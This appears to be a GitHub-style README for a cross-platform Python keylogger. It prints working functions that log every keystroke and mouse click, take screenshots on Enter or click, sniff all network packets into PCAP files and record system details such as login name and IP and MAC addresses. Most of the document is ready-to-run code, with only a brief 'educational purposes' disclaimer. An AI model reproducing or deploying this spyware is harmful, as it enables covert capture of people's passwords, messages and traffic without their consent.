# Keylogger and Network Monitoring Script

This Python script provides a comprehensive solution for keylogging, mouse click monitoring, network packet capture, and system information gathering. It is designed to run on macOS, Windows, and Linux operating systems.

## Features

- Keylogging: Captures keyboard input and logs the pressed keys along with the associated window information.
- Mouse Click Monitoring: Logs mouse clicks with the corresponding coordinates, button, and window information.
- Screenshot Capture: Takes screenshots whenever the Enter key is pressed or a mouse click occurs, saving them with a timestamp and the associated window title and process name.
- Network Packet Capture: Captures network packets using the Scapy library and saves them to a PCAP file.
- System Information Gathering: Collects various system information such as operating system details, CPU information, memory usage, network interfaces, and mounted drives.
- Logging: Logs all the captured events and system information to a log file with timestamps.
- Cross-Platform Support: Supports macOS, Windows, and Linux operating systems.

## Requirements

- Python 3.x
- Required Python libraries: `mss`, `pynput`, `scapy`, `psutil`
- Operating System specific libraries:
  - macOS: `pyobjc`
  - Windows: `pywin32`
  - Linux: `python-xlib`

## Installation

1. Clone the repository or download the script file.

2. Install the required Python libraries by running the following command:

   ```
   pip install -r requirements.txt
   ```

   If you don't have a `requirements.txt` file, you can manually install the libraries using the following command:

   ```
   pip install mss pynput scapy psutil pyobjc pywin32 python-xlib
   ```

   Note: The `pyobjc` library is only required for macOS, `pywin32` for Windows, and `python-xlib` for Linux.

3. Run the script using the following command:

   ```
   python spoopty.py
   ```

   Make sure to replace `keylogger.py` with the actual name of the script file if it's different.

## Configuration

The script does not require any additional configuration. It automatically creates the necessary directories (`Logs`, `Screen Captures`, and `Packets`) in the same location as the script file.

## Usage

Once the script is running, it will start capturing keystrokes, mouse clicks, and network packets. The captured data will be logged to the respective log files in the `Logs` directory. Screenshots will be saved in the `Screen Captures` directory, and network packets will be saved as PCAP files in the `Packets` directory.

To stop the script, press `Ctrl+C` in the terminal where the script is running.

## Code Explanation

Here are some key components of the code:

### Gathering System Information

The `gather_system_info()` function collects various system information using the `platform`, `psutil`, and `socket` modules. It retrieves details such as the operating system, CPU information, memory usage, network interfaces, and mounted drives. The gathered information is then logged to the log file.

```python
def gather_system_info():
    info = ["System Information:"]
    info.append(f"Operating System: {platform.system()} {platform.release()} {platform.version()}")
    info.append(f"Architecture: {platform.machine()}")
    info.append(f"Processor: {platform.processor()}")
    info.append(f"CPU Frequency: {psutil.cpu_freq().current if psutil.cpu_freq() else 'N/A'} MHz")
    info.append(f"Physical cores: {psutil.cpu_count(logical=False)}")
    info.append(f"Total cores: {psutil.cpu_count(logical=True)}")
    info.append(f"RAM: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB")
    info.append(f"Login Name: {os.getlogin()}")

    warned_interfaces = set()
    for interface, addrs in psutil.net_if_addrs().items():
        has_ipv4 = False
        for addr in addrs:
            if addr.family == socket.AF_INET:
                info.append(f"IP Address ({interface}): {addr.address}")
                has_ipv4 = True
                break
            elif addr.family == psutil.AF_LINK:
                info.append(f"MAC Address ({interface}): {addr.address}")
        if not has_ipv4 and interface not in warned_interfaces:
            info.append(f"WARNING: No IPv4 address found on {interface} !")
            warned_interfaces.add(interface)

    for partition in psutil.disk_partitions():
        info.append(f"Mounted drive: {partition.device} mounted on {partition.mountpoint} with fstype {partition.fstype}")

    return '\n'.join(info)
```

### Keylogging and Mouse Click Monitoring

The script uses the `pynput` library to monitor keyboard and mouse events. The `on_press()`, `on_release()`, and `on_click()` functions are callback functions that are triggered when the corresponding events occur. These functions log the captured events along with the associated window information.

```python
def on_click(x, y, button, pressed):
    if pressed:
        action = f"Mouse clicked at ({x}, {y}) with button {button}"
        log_interaction(f"[Mouse Click] {action}")
        take_screenshot(action)

def on_press(key):
    try:
        action = f"Key pressed: {key}"
        log_interaction(f"[Keyboard Input] {action}")
        if key == keyboard.Key.enter:
            take_screenshot(action)

        # Check for related packet captures with exact line numbers
        related_packets = []
        pcap_file = f'Packets/{os_name}_{current_datetime}.pcap'
        if os.path.exists(pcap_file):
            packets = rdpcap(pcap_file)
            for i, pkt in enumerate(packets):
                if pkt.haslayer(TCP) and pkt[TCP].payload:
                    payload = pkt[TCP].payload.load.decode('utf-8', 'ignore')
                    if str(key) in payload:
                        related_packets.append((i + 1, payload))  # Store line number and payload

        if related_packets:
            interaction_details = ", ".join(f"Line {line}: {data}" for line, data in related_packets)
            log_interaction(f"[Keyboard Input] {action} - Related Packets: {interaction_details}")

    except Exception as e:
        logging.error(f"Error processing key press: {str(e)}")

def on_release(key):
    action = f"Key released: {key}"
    log_interaction(f"[Keyboard Release] {action}")
```

### Screenshot Capture

The `take_screenshot()` function is responsible for capturing screenshots whenever the Enter key is pressed or a mouse click occurs. It uses the `mss` library to capture the screenshot and saves it with a timestamp, the associated window title, and the process name.

```python
def take_screenshot(action):
    directory = "Screen Captures"
    os.makedirs(directory, exist_ok=True)  # Ensure the directory exists
    with mss.mss() as sct:
        window_info = get_window_info()
        if ' - ' in window_info:
            window_title, process_name = window_info.split(' - ', 1)  # Split safely with maxsplit
        else:
            window_title = 'unknown'
            process_name = psutil.Process().name()

        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        sanitized_title = sanitize_filename(window_title)
        sanitized_process = sanitize_filename(process_name)
        filename = f"{directory}/{timestamp}_{sanitized_title}_{sanitized_process}.png"

        try:
            sct.shot(output=filename)
            log_interaction(f"Screenshot captured: {filename}")
        except Exception as e:
            logging.error(f"Failed to capture screenshot: {str(e)}")
```

### Network Packet Capture

The script uses the Scapy library to capture network packets. The `packet_capture_worker()` function is run in a separate process to continuously capture packets until the stop event is set. The captured packets are saved to a PCAP file.

```python
def packet_capture_worker(stop_event, filename):
    packets = []
    def handle_packet(packet):
        packets.append(packet)
    try:
        sniff(prn=handle_packet, stop_filter=lambda x: stop_event.is_set())
        wrpcap(filename, packets)
    except Exception as e:
        logging.error(f"Failed to capture packets: {str(e)}")

def start_packet_capture(filename):
    stop_event = multiprocessing.Event()
    packet_process = multiprocessing.Process(target=packet_capture_worker, args=(stop_event, filename))
    packet_process.start()
    return stop_event, packet_process

def stop_packet_capture(stop_event, packet_process):
    stop_event.set()
    packet_process.join()
```

### Logging

The script uses the `logging` module to log all the captured events and system information to a log file. The log file is created with a timestamp and the operating system name in the `Logs` directory.

```python
def setup_logging():
    logging.basicConfig(filename=log_file_path, level=logging.INFO, format='%(asctime)s - %(message)s')

    with open(log_file_path, 'a') as log_file:
        log_file.write("System Information:\n")
        log_file.write(gather_system_info() + '\n')
        log_file.write("------------------------\n")
```

## Legal Disclaimer

This script is provided for educational and informational purposes only. The use of this script to monitor or capture data from systems or networks without proper authorization and consent is strictly prohibited and may violate applicable laws and regulations. The author and contributors of this script are not responsible for any misuse or illegal activities conducted using this script. It is the user's responsibility to ensure that they have the necessary permissions and comply with all applicable laws and ethical guidelines when using this script.

## License

This script is licensed under the GNU General Public License (GPL). You are free to use, modify, and distribute this script under the terms of the GPL. However, please note that the script is provided "as is" without any warranty or liability. The author and contributors of this script shall not be held responsible for any damages or consequences arising from the use of this script.

For more information about the GPL, please refer to the [GNU General Public License](https://www.gnu.org/licenses/gpl-3.0.en.html).

## Disclaimer

This script is intended for educational and informational purposes only. The author and contributors of this script do not endorse or encourage any illegal or unethical activities. Use this script responsibly and in compliance with all applicable laws and regulations.
